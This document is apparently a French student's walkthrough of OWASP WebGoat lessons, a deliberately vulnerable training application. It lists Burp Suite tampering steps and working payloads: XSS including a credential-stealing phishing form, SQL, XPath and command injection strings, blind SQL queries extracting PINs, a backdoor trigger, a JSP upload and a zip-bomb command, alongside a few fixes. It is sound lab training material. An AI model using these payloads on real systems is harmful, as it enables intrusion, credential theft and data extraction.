# WebGoat

IP : 10.0.1.42
PORT : 8080
URL : http://10.0.1.43:8080/WebGoat/

### bypass a path based access control scheme

utiliser burpsuite
Aller dans l'onglet Target et sous-onglet Scope

et rajouter l'adresse ip cible

Target:http://10.0.1.43:8080
Aller dans l'onglet proxy et sous-onglet HTTP history pour intercepter les pages cibles
faire un clic droit sur la page cible et le rajouter dans "Repeater"
dans l'onglet Repeater rajouter et envoyer (jusqu'a ce qu'on y a accès) des ../ qui permet d'acceder au dossier/fichier a partir de la bonne "direction"

### Lab: role based access control

utiliser burpsuite

intercepter une des pages permettant de modifier/voir le profil cible
envoyer la page dans Repeater et modifier "employee_id=105&actionViewProfile (ou EditProfile) et de le modifier en DeleteProfile
envoyer et sur le site, appuyer sur la balise modifier et vous irez directement dans step2

**Stage 2: Add Business Layer Access Control**

L'objectif de cet exercice est de modifier le code existant afin de mettre en place un "patch de sécurité" qui corrige la faille de vulnérabilité étudié au stage 1.
Info.png
Note
Cet exercice ne peut être réalisé qu'avec la version "Developer" de WebGoat.

cd ~/WebGoat-5.2/tomcat/webapps/WebGoat/JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/
vim  RoleBasedAccessControl.java

Puis repérer la section "CODE HERE". Y insérer le code suivant :

//***************CODE HERE*************************
if(!isAuthorized(s, userId, requestedActionName))
{
throw new UnauthorizedException();
}
//*************************************************

Enregistrer puis retester les droits de suppression.

**Stage 3**

lancer intercept et se connecter en tant que tom, modifier l'id de connection (toujours dans intercept) et appuyer sur forward

### Ajax Security Dom injection**

juste enlever le terme disabled du bouton activate

### Lab:Dome-based css

**Stage 1**: Mettre ceci dans le cadre "<IMG SRC="images/logos/owasp.jpg"/>" (avec guillemet)

**Stage 2**: Enter "<img src=x onerror=;;alert('XSS') />" and submit the solution.

**Stage 3**: Enter "<IFRAME SRC="javascript:alert('XSS');"></IFRAME>" and submit the solution.

**Stage 4**: Enter "Please enter your password:<BR><input type = "password" name="pass"/><button onClick="javascript:alert('I have your password: ' + pass.value);">Submit</button><BR><BR><BR><BR><BR><BR><BR><BR> <BR><BR><BR><BR><BR><BR><BR><BR>" and submit the solution.

**Stage 5**: You have to use the JavaScript escape.js for the input.
You will find the JavaScripts in tomcat\webapps\WebGoat\javascript ( Standart Version ) or in WebContent\javascript ( Developer Version ).
Open the JavaScript DOMXSS.js

```function displayGreeting(name) {
if (name != ''){
document.getElementById("greeting").innerHTML="Hello, " + name + "!";
}
}

You have to change this to:

function displayGreeting(name) {
if (name != ''){
document.getElementById("greeting").innerHTML="Hello, " + escapeHTML(name); + "!";
}
}
```

The attacks will no longer work.

### XML Injection

Mettre l'id account dans le champs et ensuite selectionner les 3 checkbox
appuyer sur le bouton intercept dans burpsuite et appuyer sur submit dans la page web
modifier les " &check1003=on " en 1004 et 1005 et ne pas oublier de déselectionner les 3 premiers en indiquant "off"
Appuyer sur Forward

### JSON Injection

Mettre dans les champs BOS et SOA, choisir le "1e vol" intercepter avec burp suite et changer la valeur du submit en %2422 et faire forward

### Silent Transaction Attack

envoyer dans la console: " javascript:submitData(123,11000); "

### Insecure Client Storage

Dans la console javascript du navigateur faire " javascript:alert(decrypt('emph')); " (ou tout autre "code" présent dans le code javascript du site web en question), ça va donc décrypter directement

Stage2
Enlever dans le html le sous total après coupon le nom "GranTot" et laisser le champ de la carte de banque vide

### Dangerous use of eval

ajouter dans un formulaire: " ');alert(document.cookie);(' "

### Same Origin Policy Protection

entrer un url: /WebGoat/plugin_extracted/plugin/SameOriginPolicyProtection/jsp/sameOrigin.jsp and http://www.google.com/search?q=aspect+security

### BufferOverflow

remplir les champs normalement et sur la deuxième page, modifier dans l'inspecteur les éléments du champs qui sont sur "HIDDEN" et les mettre sur "BLOCK" et ajouter dans le champ room 4097 numéros et envoyer
Sur la 2e page voir dans l'inspecteur pour voir les autres clients

refaire la leçon mais en mettant Lewis Hamilton 9901 dans les champs

### Cross-Site Scripting (XSS)

#### Phishing with XSS

mettre

```
</form><script>function hack(){ XSSImage=new Image; XSSImage.src="http://localhost:8080/WebGoat/catcher?PROPERTY=yes&user=" + document.phish.user.value + "&password=" + document.phish.pass.value + "";alert("Had this been a real attack... Your credentials were just stolen. User Name = " + document.phish.user.value + " Password = " + document.phish.pass.value);} </script><form name="phish"><br><br><HR><H3>This feature requires account login:</H2><br><br>Enter Username:<br><input type="text" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR>
```

dans le champ de recherche et inscrire un user et un mot de passe, un pop up s'ouvre pour dire que ça été hacké
(par contre ça n'indique pas que c'est réussi et ça revient à l'exercice initial)

#### Stored XSS Attacks

Mettre un titre
dans le message mettre un script, soit celui de l'exercice précédent, soit
`<script language="javascript" type="text/javascript">alert("Ha Ha Ha");</script>`

cliquez sur submit et ensuite cliquez et ensuite sur le titre

#### stage 1 Stored XSS

Aller dans le profil de tom pour le modifier et mettre dans un des champs un script comme
`<script> alert ('you hacked')</script>`
se déconnecter et se connecter sur le profil de jerry

### Fail Open Authentication Scheme

Mettre webgoat comme username et intercepter avec burpsuite pour effacer le &password=, faire forward et ainsi on est connecter

### Command Injection

Changer le select en formulaire

```
<input name="HelpFile" value="AccessControlMatrix.help">
<input name="SUBMIT" type="SUBMIT" value="View">
```

et inscrire
`" & netstat -an & ipconfig ` juste a coté du fichier selectionné (comme AccesControlMatrix.help)
et normalement ça doit fonctionner

[//]: # (Il semble que vous soyez sur la bonne voie. Les commandes qui peuvent compromettre le système d'exploitation ont été désactivées. Les commandes suivantes sont autorisées : netstat -a, dir, ls, ifconfig et ipconfig.)

### Injection Flaws
#### Numeric SQL Injection
Choisir une station intercepter avec burpsuite, faire go 
dans la phrase station=101&submit=GO!
modifier = station=101 or 1=1&submit=go!

#### Log Spoofing
ajouter dans username Smith%0d%0a et faire login

#### XPATH Injection
ajouter dans user name: Smith' or 1=1 or 'a'='a et password: a

Tout comme l'injection SQL, les attaques par injection XPATH se produisent lorsqu'un site Web utilise des informations fournies par l'utilisateur pour interroger des données XML. En envoyant des informations intentionnellement malformées sur le site Web, un attaquant peut découvrir la structure des données XML ou accéder à des données auxquelles il n'a normalement pas accès. Il peut même être en mesure d'élever ses privilèges sur le site Web si les données XML sont utilisées pour l'authentification (comme un fichier utilisateur basé sur XML). L'interrogation du XML se fait avec XPath, un type d'instruction descriptive simple qui permet à la requête xml de localiser un élément d'information. Comme pour SQL, vous pouvez spécifier certains attributs à rechercher et des modèles à faire correspondre. Lorsqu'on utilise le XML pour un site Web, il est courant d'accepter une certaine forme d'entrée dans la chaîne de requête pour identifier le contenu à localiser et à afficher sur la page. Cette entrée doit être nettoyée pour vérifier qu'elle ne perturbe pas la requête XPath et ne renvoie pas des données erronées.

Traduit avec www.DeepL.com/Translator (version gratuite)

### String SQL Injection
Mettre la même chose que l'exercice précédent

### Database Backdoors
mettre dans User ID: 101; update employee set salary=10000
Stage2: CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='john@hackme.com'WHERE userid = NEW.userid

* Error generating org.owasp.webgoat.lessons.BackDoors `<script>alert('ha ha ha')</script>`


### Blind Numeric SQL Injection
en utilisant ce code et jouant sur l'opérateur + petit ou + grand on peut savoir si un numéro est valid (ou dans le vrai) ou non
(le jeu du "trouver un chiffre entre 1 et 100")
101 AND ((SELECT pin FROM pins WHERE cc_number='1111222233334444') > 10000 );Invalid
101 AND ((SELECT pin FROM pins WHERE cc_number='1111222233334444') < 1000 );Valid
101 AND ((SELECT pin FROM pins WHERE cc_number='1111222233334444') < 500 );Invalid
.
.
.
101 AND ((SELECT pin FROM pins WHERE cc_number='1111222233334444') = 2364 ); valid

### Blind String SQL Injection
Même chose que l'exercice précédent avec des lettres
`101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 1, 1) <= 'J' );`

```
101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 2, 1) <= 'i' );
101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 3, 1) <= 'i' );
101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 4, 1) <= 'l' );
```

```SELECT name FROM pins WHERE cc_number='4321432143214321'), 4, 1) <= 'l' );
An error occurred, please try again.
Wrong data type: java.lang.NumberFormatException: For input string: "Jill"
```

### Denial of Service
#### Zip Bomb
dd if=/dev/zero bs=1024 count=10000 | zip zipbomb.zip
Remplacez count par le nombre de Ko que vous souhaitez compresser. L'exemple ci-dessus crée une bombe zip 10MiB

##### Denial of service from multiple logins
Mettre ' or '1' = '1 dans le champ du mot de passe
ensuite se logger avec les 3 premiers users (???)

### Insecure Login
Intercepter le formulaire avec burpsuite
le mot de passe: sniffy

Stage2
**For this lesson you need to have a server client setup. Please refer to theTomcat Configuration in the Introduction section.**

### Malicious File Execution
Inserer une image lambda et faire start Upload
dans un fichier texte, inscrire 
`<html> <% java.io.File file = new java.io.File("/.extract/webapps/WebGoat/mfe_target/guest21.txt"); file.createNewFile(); %> <html>`
et l'enregistrer au format jsp
l'inserer dans le site web
"l'image" qui sera affiché, l'ouvrir dans un nouvel onglet
rafraichir la page principale
